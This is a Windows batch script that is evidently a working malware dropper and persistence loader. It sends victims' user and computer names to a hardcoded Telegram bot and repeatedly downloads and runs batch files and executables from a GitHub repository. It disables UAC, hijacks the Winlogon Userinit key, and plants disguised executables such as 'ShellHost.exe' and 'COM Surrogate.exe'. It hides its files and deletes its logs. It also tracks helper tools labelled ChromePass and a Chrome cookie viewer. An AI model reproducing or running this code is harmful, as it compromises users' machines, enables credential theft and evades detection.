@echo off


setlocal enabledelayedexpansion


if exist "%temp%\i059.tmp" exit

:: Count the instances of ProtectionWindowsHostProcess.exe
set "instances=0"
for /f "tokens=1 delims=," %%A in ('tasklist /fo csv /nh ^| findstr /i /c:"ProtectionWindowsHostProcess.exe"') do (
    set /a instances+=1
)

:: Check if one or more instances are found
if !instances! geq 2 (
    echo ProtectionWindowsHostProcess.exe is already running. Exiting batch...
	timeout /t 3 /nobreak
    goto :EOF
)



::goto :EOF


set "BATCHVERSION=46.1T"
set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
del /f /a /q "%LOGFILE%"
set "RESULT=%TEMP%\TGRESU.txa"
set "ALLOWED=124"
::set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"



::pause
::goto :LOOPRUNEVERY

::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RNEVRYSTARTED.APPROVED" >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1


::goto :EOF




echo CD = %CD% >> "%LOGFILE%" 2>&1
cd %temp%
echo CD = %CD% >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo BATCHVERSION = %BATCHVERSION% >> "%LOGFILE%" 2>&1
echo %date% %time% >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1


:retryruncallermd5
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/RunEveryCallerMD5') do (
    set "RUNEVERYOFFICIALMD5=%%i"
    echo. >> "%LOGFILE%" 2>&1
    goto donee1
)
goto retryruncallermd5

:donee1
echo. >> "%LOGFILE%" 2>&1
echo RUNEVERYOFFICIALMD5 = %RUNEVERYOFFICIALMD5% Hello >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1


echo. >> "%LOGFILE%" 2>&1
attrib +h +s "%LOGFILE%"
echo Allowed PCs : >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo %ALLOWED% >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo %ALLOWED% | findstr /i "\<%COMPUTERNAME%\>" >nul && goto RUNEVERYSTARTED








goto NEXTRUNEVERY




:RUNEVERYSTARTED
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo %COMPUTERNAME% Found. >> "%LOGFILE%" 2>&1
curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RNEVRYSTARTED.APPROVED" >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
timeout /t 12 /nobreak >> "%LOGFILE%" 2>&1
del /f /a /q "%LOGFILE%"
goto :EOF


:NEXTRUNEVERY
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo %COMPUTERNAME% Not Found. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1 













:CHECKRUNEVERY
echo CHECKRUNEVERY Started >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1


:: Define the folder and file paths
set "targetFolder=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks"
set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"

:: Ensure the folder exists
if not exist "%targetFolder%" (
    echo Creating folder: "%targetFolder%" >> "%LOGFILE%" 2>&1
    mkdir "%targetFolder%" 
)

if not exist "%startupFile%" (
    copy "%sourceFile%" "%startupFile%" /y >> "%LOGFILE%" 2>&1
)

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1 
::timeout /t 5 /nobreak 
echo. >> "%LOGFILE%" 2>&1


echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



if not exist "%startupFile%" (
    echo %startupFile% Not Found.. Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
	set "GoingINSTRUNEVERY=1"
	rem goto INSTRUNEVERY
)

if "%GoingINSTRUNEVERY%"=="1" goto INSTRUNEVERY


echo. >> "%LOGFILE%" 2>&1
echo %startupFile% Found. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1


for /f "tokens=* delims=" %%A in ('certutil -hashfile "%sourceFile%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "RUNEVERYROOTMD5=%%tmp: =%%"
for /f "tokens=* delims=" %%A in ('certutil -hashfile "%startupFile%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "RUNEVERYSTARTUPSMD5=%%tmp: =%%"

echo MD5 of "%sourceFile%" = %RUNEVERYROOTMD5% >> "%LOGFILE%" 2>&1
echo MD5 of "%startupFile%" = %RUNEVERYSTARTUPSMD5% >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1 
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



if "%RUNEVERYROOTMD5%"=="%RUNEVERYOFFICIALMD5%" (
    echo MD5 matches %RUNEVERYROOTMD5% = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1 
) else (
    echo MD5 doesnt match %RUNEVERYROOTMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
    goto INSTRUNEVERY
)

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1

if "%RUNEVERYSTARTUPSMD5%"=="%RUNEVERYOFFICIALMD5%" (
    echo MD5 matches %RUNEVERYSTARTUPSMD5% = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
) else (
    echo MD5 doesnt match %RUNEVERYSTARTUPSMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
    goto INSTRUNEVERY
)


echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
:: RunEvery Files & Task Found goto NEXT 
echo RunEvery Files and Task Found with MD5 Check. Going to AFTERORSKIPINSTALLRUNEVERY >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
goto AFTERORSKIPINSTALLRUNEVERY






:INSTRUNEVERY

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



:CheckHandle
echo :CheckHandle Started.. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1

set "file9=%SystemRoot%\System32\handle.exe"

:: Check handle.exe; if found, skip to next section
if exist "%file9%" (
    echo %file9% found. Going to RUNEVERYINSTALL >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    goto RUNEVERYINSTALL
)

:: Run commands if handle.exe is not found
echo Checking for handle... >> "%LOGFILE%" 2>&1
set "embeddedScript=%temp%\temp_script_handle.bat"
del /f /a /q "%embeddedScript%" >> "%LOGFILE%" 2>&1

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle" >> "%LOGFILE%" 2>&1
attrib +h +s "%embeddedScript%"

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    call "%embeddedScript%" >> "%LOGFILE%" 2>&1
    del /f /a /q "%embeddedScript%" >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
) else (
    echo Failed to get content from Handle Link >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    timeout /t 3 /nobreak  >> "%LOGFILE%" 2>&1
    goto CheckHandle
)




echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1





:RUNEVERYINSTALL
echo. >> "%LOGFILE%" 2>&1
echo RUNEVERYINSTALL Started.. >> "%LOGFILE%" 2>&1
:: Run commands if ShellHost.exe is not found
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1







:LOOPRUNEVERY
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo LOOPRUNEVERY started..
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



if exist "%temp%\RUNEVERYCALLERFINAL.exe" (
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo RunEveryCallerFinal Found. Starting.. >> "%LOGFILE%" 2>&1
    timeout /t 5 /nobreak  >> "%LOGFILE%" 2>&1
    start "" "%TEMP%\RUNEVERYCALLERFINAL.exe"
    echo Start done. Deleting log file then Going to :EOF >> "%LOGFILE%" 2>&1
    rem timeout /t 2 /nobreak  >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    echo. >> "%LOGFILE%" 2>&1
    del /f /a /q "%LOGFILE%"
    goto :EOF
)



set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo Filename=!filename!.exe
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1




:DOWNLOADINGAGAINRUNEVERY
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo DOWNLOADINGAGAINRUNEVERY Started.. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1



:: Kill & Delete file 
taskkill /f /im !filename!.exe >> "%LOGFILE%" 2>&1
del /f /a /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
 
echo. >> "%LOGFILE%" 2>&1
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerForRunEveryRunning') do set "RUNFILELINK=%%i"

echo. >> "%LOGFILE%" 2>&1
echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1

:: Download the file using curl
curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
 
echo. >> "%LOGFILE%" 2>&1
 
timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
 
:: Checking the existing of the file
if not exist "%TEMP%\!filename!.exe" (
    echo. >> "%LOGFILE%" 2>&1
    echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
	echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
	timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
	echo. >> "%LOGFILE%" 2>&1
	goto DOWNLOADINGAGAINRUNEVERY
)
 
 
 
:: Get the file size in bytes
for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
 
 
:: Check if the file size is at least 80KB (80000 bytes)
if %FILESIZE% geq 80000 (
    timeout /t 10 /nobreak >> "%LOGFILE%" 2>&1
    start "" "%TEMP%\!filename!.exe"
    echo Started.. >> "%LOGFILE%" 2>&1
) else (
echo.
    echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
	timeout /t 2 /nobreak  >> "%LOGFILE%" 2>&1
	echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
	timeout /t 2 /nobreak  >> "%LOGFILE%" 2>&1
	echo. >> "%LOGFILE%" 2>&1
	goto DOWNLOADINGAGAINRUNEVERY
)
 
echo. >> "%LOGFILE%" 2>&1

echo Patcher Running...

echo. >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%" 2>&1
echo After 10sec LOGFILE will deleted then going to end directly >> "%LOGFILE%" 2>&1
rem timeout /t 10 /nobreak  >> "%LOGFILE%" 2>&1
del /f /a /q "%LOGFILE%"
goto :EOF








:AFTERORSKIPINSTALLRUNEVERY
echo. 
echo. 
echo. 
echo AFTERORSKIPINSTALLRUNEVERY Started..
echo.
echo.







set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename1=!filename!"
set "filename="




:: Set the log file path
::set "LOGFILE=%temp%\!filename1!.mpeez"





:: Start logging from this point
call :LogOutput >> "%LOGFILE%" 2>&1
echo.
::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
::timeout /t 15 /nobreak
del /f /a /q "%LOGFILE%"
::attrib -h -s "%temp%\temp_scrip*.bat" & del /f /a /q "%temp%\temp_scrip*.bat"
del /f /a /q %temp%\*.mseuopm
del /f /a /q %temp%\*.mpee
del /f /a /q %temp%\*.qwb
del /f /a /q "%RESULT%"
echo.
goto :EOF

:LogOutput
:: Your long batch script starts here



for /l %%i in (1,1,12) do echo.









::  Checking If Noot Win 10 & 11 Run Setup Directly!!
set "WindowsVersion=0"
echo My Windows Version.
REM Get CurrentBuildNumber from registry
for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber 2^>nul') do (
    set "build=%%a"
)

REM If not retrieved, fallback to :RUNSETUPDIRECTLY
if not defined build (
   echo Failed to detect build number. Assuming older Windows.
)

REM Convert to number and compare
set /a buildnum=%build%





:: Detect OS based on build number
if %buildnum% LSS 8000 (
    echo Windows XP or 7
    set "WindowsVersion=7"
)

if %buildnum% GEQ 8000 if %buildnum% LSS 9600 (
    echo Windows 8 or 8.1
    set "WindowsVersion=8.1"
)

if %buildnum% GEQ 9600 if %buildnum% LSS 22000 (
    echo Windows 10
    set "WindowsVersion=10"
)

if %buildnum% GEQ 22000 (
    echo Windows 11
    set "WindowsVersion=11"
)


echo.
echo.


















:: Define allowed HWIDs here
set "VALID_HWIDS="






::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING107"




set "KMSRUNNING=0"
set "SHSTRUNNING=0"

echo BATCHVERSION = %BATCHVERSION%
echo %date% %time%
echo.
echo.


net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running as Administrator
) else (
    echo Not running as Administrator
)

echo.
echo.




echo Maybe Turning CheckSend=1
set "CheckSend=0"
set "SENDSCREENSHOT=1"
set "lastMinute=none"
echo CheckSend=!CheckSend!
echo.






for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename2=!filename!"
set "filename="




set "InstalledQWB=%temp%\!filename2!.qwb"
del /f /a /q "%InstalledQWB%"





if exist "%SystemRoot%\System32\handle.exe" goto CHECKLOCKFILE
goto AFTERCHECKLOCKFILE



:CHECKLOCKFILE
echo Handle.exe exist
echo.
:: Set the target file path
set "FILE_TO_CHECK=%temp%\STLRLOG.mseuope"


:: Find processes locking the file
reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
echo Handle LOGFILE TA3 RUNEVERY
handle.exe "%LOGFILE%"
echo.
echo Handle Process ShellHost 
handle.exe "%ProgramData%\Microsoft\Windows\ShellHost.exe"
echo.
echo.
echo.
echo Handle Process KMSAuto 
handle.exe "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
echo.
echo.




:AFTERCHECKLOCKFILE




if exist "%temp%\STLRLOG.mseuope" (
    echo STLRLOG.mseuope exists
) else (
    echo STLRLOG.mseuope not exist
)
echo.
echo.



:: Place HWID into %HWID% variable 
for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i








:: Initialize the loop counter outside of the loop
:: set loopCount=0




:loop_start
echo :loop_start
echo.


echo. >> "%InstalledQWB%"
attrib +h +s "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo Updates : >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"






::ShellHost.exe ---> TSSPrxySHST.exe
::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
::COM Surrogate.exe ---> SyncHostApp.exe
::KMSAuto.exe ---> TSSKMS.exe
::StartupTaskCaller.exe ---> TSSPrxySTC.exe





:RUNADMINHERE
cd /d "%~dp0"
:: Run All your commands here ( will be executed with admin privileges )


:: Disable UAC 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f




set "COMSTARTED=0"










:NEXT3
echo.



reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit

echo Adding...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" /f
echo.

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
echo.




:EVERYSECOND
echo :EVERYSECOND
echo.





:CWP
echo :CWP
echo.

:: Define the paths
set "sourceFile=%SystemRoot%\System32\CWProcess.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"

if not exist "%sourceFile%" goto SHST

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
    set "MESSAGE=CWProcessRecovered^|"
) else (
    echo File is already in %startupFile%.
)

timeout /t 1 /nobreak 









:SHST
echo :SHST
echo.

:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"

if not exist "%sourceFile%" goto COM

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
    set "MESSAGE=%MESSAGE%SHSTRecovered^|"
) else (
    echo File is already in %startupFile%.
)

timeout /t 1 /nobreak 







:COM
echo :COM
echo.

:: Define the paths
set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"

if not exist "%sourceFile%" goto KMS

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
    set "MESSAGE=%MESSAGE%COMRecovered^|"
) else (
    echo File is already in %startupFile%.
)

del /f /a /q "%appdata%\*.ps1"
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f

timeout /t 1 /nobreak 







:KMS
echo :KMS
echo.


:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"

if not exist "%sourceFile%" goto PUUNY

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
    set "MESSAGE=%MESSAGE%KMSRecovered^|"
    echo Turning CheckSend=1
    set "CheckSend=1"
) else (
    echo File is already in %startupFile%.
)

timeout /t 1 /nobreak 

:PUUNY

echo MESSAGE KMS IS = %MESSAGE%
echo CheckSenddd IS = %CheckSend%

echo.
echo.

:CHECKSTARTUPPROGRAMS
echo :CHECKSTARTUPPROGRAMS
echo.



:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 

:: Define the list of files to check
set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
set "file4=%APPDATA%\Microsoft\nircmd.exe"
set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
set "file6=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
set "file7=%APPDATA%\Microsoft\7z.exe"
set "file8=%APPDATA%\Microsoft\7z.dll"
set "file9=%SystemRoot%\System32\handle.exe"
set "file10=%SystemRoot%\System32\wudtest.exe"
set "file11=%SystemRoot%\System32\DataCacheViewer.exe"
set "file12=%SystemRoot%\System32\Systeminterruptshost.exe"
set "file13=%SystemRoot%\System32\DeviceFrameworkServer.exe"

echo Typing in %InstalledQWB%
echo.

if exist "%file1%" echo COM Surrogate.exe Found in %file1% >> "%InstalledQWB%"
if exist "%file2%" echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
if exist "%file3%" echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
if exist "%file4%" echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
::if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6% >> "%InstalledQWB%"
if exist "%file7%" if exist "%file8%" (
    echo 7z.exe and 7z.dll Found in %file7% and %file8% >> "%InstalledQWB%"
) else (
    if exist "%file7%" echo 7z.exe Found in %file7% >> "%InstalledQWB%"
    if exist "%file8%" echo 7z.dll Found in %file8% >> "%InstalledQWB%"
)
if exist "%file9%" echo handle.exe Found in %file9% >> "%InstalledQWB%"
if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10% >> "%InstalledQWB%"
if exist "%file11%" echo ChrmCksViewer Found in %file11% >> "%InstalledQWB%"
if exist "%file12%" echo RunBatHidden Found in %file12% >> "%InstalledQWB%"
if exist "%file13%" echo ChromePass Found in %file13% >> "%InstalledQWB%"


:: Check each file
if not exist "%file1%" goto STARTUPTAASK
if not exist "%file2%" goto STARTUPTAASK
if not exist "%file3%" goto STARTUPTAASK
if not exist "%file4%" goto STARTUPTAASK
if not exist "%file5%" goto STARTUPTAASK
::if not exist "%file6%" goto STARTUPTAASK
if not exist "%file7%" goto STARTUPTAASK
if not exist "%file8%" goto STARTUPTAASK
if not exist "%file9%" goto STARTUPTAASK
if not exist "%file10%" goto STARTUPTAASK
if not exist "%file11%" goto STARTUPTAASK
if not exist "%file12%" goto STARTUPTAASK
if not exist "%file13%" goto STARTUPTAASK

:: If all files are found, continue with other tasks
echo All files found.



:: goto COMMANDSFORAGENTS


















:STARTUPTAASK
echo :STARTUPTAASK
echo.







:CheckHandle
echo :CheckHandle
echo.

:: Check handle.exe; if found, skip to next section
if exist "%file9%" (
    echo %file9% found. Going to CheckSHST
    echo.
    echo.
    echo.
    goto CheckSHST
)

:: Run commands if handle.exe is not found
echo Checking for handle...
set "embeddedScript=%temp%\temp_script_handle.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Failed to get content from Handle Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckHandle
)

set "MESSAGE=%MESSAGE%Handle^|"
echo Turning CheckSend=1
set "CheckSend=1"


echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.

























:CheckSHST
echo :CheckSHST
echo.



set "ShellHostMD5=5f2000d1452e1e270a363e1d8fac91f0"
set "KMSAutoMD5=8492873672e236b86f7d5fdf0d0d699b"




set "SHSTFILE=%ProgramData%\Microsoft\Windows\ShellHost.exe"
set "SHSTFILEroot=%SystemRoot%\System32\TSSPrxySHST.exe"



echo Checking if %SHSTFILE% exists...

if exist "%SHSTFILE%" (
    echo %SHSTFILE% found . Going to CHECKSHSTMD5
    goto CHECKSHSTMD5
) else (
    echo %SHSTFILE% not found . Going to SHSTINSTALL
    goto SHSTINSTALL
)


:CHECKSHSTMD5

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "SHSTFILEmd5=%%tmp: =%%"
for /f "tokens=* delims=" %%A in ('certutil -hashfile "%SHSTFILEroot%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "SHSTFILErootmd5=%%tmp: =%%"

echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
echo MD5 of %SHSTFILEroot% = %SHSTFILErootmd5%
echo.
echo.
echo Comparing with official MD5: %ShellHostMD5%
echo.

if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
    echo going to CheckKMSAuto
    goto CheckKMSAuto
)

echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
echo Turning CheckSend=1
set "CheckSend=1"
set "SENDSCREENSHOT=1"
set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"


echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.






echo Going to SHSTINSTALL...




:SHSTINSTALL
:: Run commands if ShellHost.exe is not found
echo Checking for ShellHost...
set "embeddedScript=%temp%\temp_script_SHST.bat"
del /f /a /q "%embeddedScript%"



:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from ShellHost Link
    echo.
    timeout /t 3 /nobreak 
    goto SHSTINSTALL
)


set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
copy "%sourceFile%" "%startupFile%"





set "MESSAGE=%MESSAGE%SHST^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.

























:CheckKMSAuto
